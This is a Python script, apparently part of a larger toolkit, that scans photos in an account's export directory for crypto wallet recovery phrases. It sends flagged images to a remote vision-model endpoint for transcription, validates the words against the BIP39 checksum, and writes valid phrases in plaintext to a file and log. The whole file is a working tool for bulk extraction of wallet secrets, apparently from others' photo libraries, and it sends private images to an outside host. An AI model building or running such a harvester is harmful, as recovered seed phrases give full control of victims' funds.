#!/usr/bin/env python3
"""Ask the vision model to transcribe a seed phrase, then checksum it.

A label is a guess; a phrase is testable.  For every photo a classifier label
flagged, this sends the ORIGINAL image (long edge 1024 px, larger than the
448 px used for labelling, because 12 words in a dialog need the pixels) with a
single instruction: transcribe the recovery phrase, one line, words only.

The answer is split into BIP39 words, every 12/15/18/21/24-window is checked
against the BIP39 checksum, and only a valid phrase is reported as a hit.  So a
hallucinated or misread phrase is rejected instead of stored.

    read_phrase.py --account x@y.com [--labels seed,seed-candidate,wallet]
                   [--rels a,b] [--side 1024] [--workers 64] [--limit N]
"""
from __future__ import annotations

import argparse
import json
import os
import re

import requests
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import classify as core  # noqa: E402
import classify_all as ca  # noqa: E402
from verify_seeds import fetch, load_rows, source_for  # noqa: E402
from worker import scan  # noqa: E402

WORD_COUNTS = (24, 21, 18, 15, 12)

PROMPT = (
    "This image may show a crypto wallet recovery phrase: 12, 15, 18, 21 or 24 "
    "lowercase English words, usually numbered and often in two columns.\n"
    "Transcribe those words in reading order, space separated, one line, "
    "lowercase. Do not include numbers, punctuation or comments.\n"
    "If there is no recovery phrase, answer exactly: none"
)


def log(message: str) -> None:
    print(time.strftime("%H:%M:%S ") + message, flush=True)


def parse_phrase(text: str, index: dict[str, int]) -> list[tuple[list[str], bool]]:
    """Every BIP39 window in the answer, with its checksum result."""
    tokens = [token for token in re.split(r"[^a-z]+", (text or "").lower()) if token]
    words = [token for token in tokens if token in index]
    found: list[tuple[list[str], bool]] = []
    for size in WORD_COUNTS:
        if len(words) < size:
            continue
        for start in range(0, len(words) - size + 1):
            chunk = words[start:start + size]
            if scan.checksum_ok(chunk, index):
                found.append((chunk, True))
                break
        if found:
            break
    if not found and words:
        # No valid window: report the run itself so a near miss is visible.
        size = next((value for value in WORD_COUNTS if len(words) >= value), 0)
        if size:
            found.append((words[:size], False))
    return found


class Transcriber:
    def __init__(self, base_url: str, model: str, side: int, timeout: int = 90):
        self.asker = core.Classifier(base_url, model, timeout=timeout)
        self.model = model
        self.side = side

    def run(self, rel: str, path: Path, prompt: str = PROMPT, max_tokens: int = 96) -> dict:
        started = time.time()
        try:
            payload = {
                "model": self.model,
                "temperature": 0,
                "max_tokens": max_tokens,
                "chat_template_kwargs": {"enable_thinking": False},
                "messages": [{
                    "role": "user",
                    "content": [
                        {"type": "text", "text": prompt},
                        {"type": "image_url",
                         "image_url": {"url": "data:image/jpeg;base64,"
                                       + core.jpeg_b64(path, side=self.side, quality=90)}},
                    ],
                }],
            }
        except Exception as error:  # noqa: BLE001
            return {"rel": rel, "status": "error", "error": f"prepare:{type(error).__name__}",
                    "raw": "", "phrase": "", "words": 0, "checksum": False,
                    "ms": int((time.time() - started) * 1000)}
        last = ""
        for attempt in range(4):
            try:
                session = self.asker.session()
                response = session.post(f"{self.asker.base_url}/chat/completions",
                                        json=payload, timeout=self.asker.timeout)
                if response.status_code == 429 or 500 <= response.status_code < 600:
                    last = f"http:{response.status_code}"
                    time.sleep(min(8, 0.5 * 2 ** attempt))
                    continue
                if response.status_code != 200:
                    raise requests.exceptions.HTTPError(
                        f"http:{response.status_code} {response.text[:200]}",
                        response=response,
                    )
                raw = (response.json()["choices"][0]["message"]["content"] or "").strip()
                return {"rel": rel, "status": "ok", "error": "", "raw": raw,
                        "ms": int((time.time() - started) * 1000)}
            except Exception as error:  # noqa: BLE001
                last = f"{type(error).__name__}: {str(error)[:160]}"
                status = getattr(getattr(error, "response", None), "status_code", 0)
                if status in (400, 413):  # payload problem: retrying cannot help
                    break
                time.sleep(min(8, 0.5 * 2 ** attempt))
        return {"rel": rel, "status": "error", "error": last, "raw": "",
                "ms": int((time.time() - started) * 1000)}


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--account", required=True)
    parser.add_argument("--labels", default="seed,seed-candidate,privatekey,recover,wallet")
    parser.add_argument("--rels", default="", help="explicit photo paths, comma separated")
    parser.add_argument("--workers", type=int, default=64)
    parser.add_argument("--side", type=int, default=1024)
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--base-url", default=os.environ.get("VISION_BASE_URL",
                        "https://e1fbo6zesvurm4-8000.proxy.runpod.net/v1"))
    parser.add_argument("--model", default=os.environ.get("VISION_MODEL", "Qwen/Qwen3.5-4B"))
    parser.add_argument("--keep", action="store_true")
    parser.add_argument("--force", action="store_true", help="re-ask photos already read")
    parser.add_argument("--thumbs", action="store_true",
                        help="read the cached 640 px thumbnail instead of the original")
    parser.add_argument("--all", action="store_true", help="ignore labels: every photo")
    args = parser.parse_args()

    accounts = ca.account_roots()
    root = accounts.get(args.account)
    if not root:
        parser.error(f"no export directory for {args.account}")

    labels = {label.strip() for label in args.labels.split(",") if label.strip()}
    if args.all:
        labels = set(core.LABELS)
    if args.rels:
        rels = [item.strip() for item in args.rels.split(",") if item.strip()]
        rows = [{"rel": rel, "label": "manual"} for rel in rels]
    else:
        rows = load_rows(args.account, labels)
    out_path = ca.OUT_DIR / f"phrase-{args.account.split('@')[0]}.jsonl"
    previous: list[dict] = []
    if out_path.is_file() and not args.force:
        for line in out_path.read_text(errors="ignore").splitlines():
            try:
                item = json.loads(line)
            except Exception:  # noqa: BLE001
                continue
            if item.get("rel"):
                previous.append(item)
    known = {item["rel"] for item in previous}
    rows = [row for row in rows if row["rel"] not in known]
    if args.limit:
        rows = rows[: args.limit]
    if not rows:
        log(f"nothing new · {len(previous)} already read")
        return
    log(f"{len(rows)} photos · side {args.side} px · labels {sorted(labels)}")

    stage = ca.STAGE / f"phrase-{args.account}"
    fetch(args.account, root, [row["rel"] for row in rows], stage)

    index = scan.word_index()
    transcriber = Transcriber(args.base_url, args.model, args.side)
    lock = threading.Lock()
    results: list[dict] = []
    started = time.time()
    done = 0

    def work(row: dict) -> None:
        nonlocal done
        rel = row["rel"]
        path = None
        if args.thumbs:
            thumb = root / "Scan" / "thumbs" / f"{rel}.jpg"
            if thumb.is_file() and thumb.stat().st_size > 0:
                path = thumb
        path = path or source_for(args.account, root, stage, rel)
        if path is None:
            record = {"rel": rel, "status": "error", "error": "missing", "raw": "",
                      "phrase": "", "words": 0, "checksum": False, "ms": 0}
        else:
            record = transcriber.run(rel, path)
            if record["status"] == "ok":
                windows = parse_phrase(record["raw"], index)
                if windows:
                    phrase, valid = windows[0]
                    record.update({"phrase": " ".join(phrase), "words": len(phrase),
                                   "checksum": valid})
                else:
                    record.update({"phrase": "", "words": 0, "checksum": False})
        record["label"] = row.get("label", "")
        with lock:
            results.append(record)
            done += 1
            if done % 50 == 0 or done == len(rows):
                elapsed = time.time() - started
                valid = sum(1 for item in results if item.get("checksum"))
                log(f"{done}/{len(rows)} · {done / elapsed:.1f}/s · valid phrases {valid}")

    with ThreadPoolExecutor(max_workers=max(1, min(args.workers, len(rows)))) as pool:
        list(pool.map(work, rows))

    results = sorted(previous + results, key=lambda item: item["rel"])
    out_path.write_text("\n".join(json.dumps(item) for item in results) + "\n")
    if not args.keep:
        import shutil

        shutil.rmtree(stage, ignore_errors=True)

    hits = [item for item in results if item.get("checksum") and item.get("rel") not in known]
    log(f"valid {len(hits)} of {len(results)} · wrote {out_path}")
    for item in hits:
        log(f"  {item['rel']}")
        log(f"    {item['words']} words: {item['phrase']}")
    misses = [item for item in results if item.get("words") and not item["checksum"]]
    log(f"near misses (words read, checksum failed): {len(misses)}")
    for item in misses[:10]:
        log(f"  {item['rel']} · {item['words']} words · {item['phrase']}")


if __name__ == "__main__":
    main()
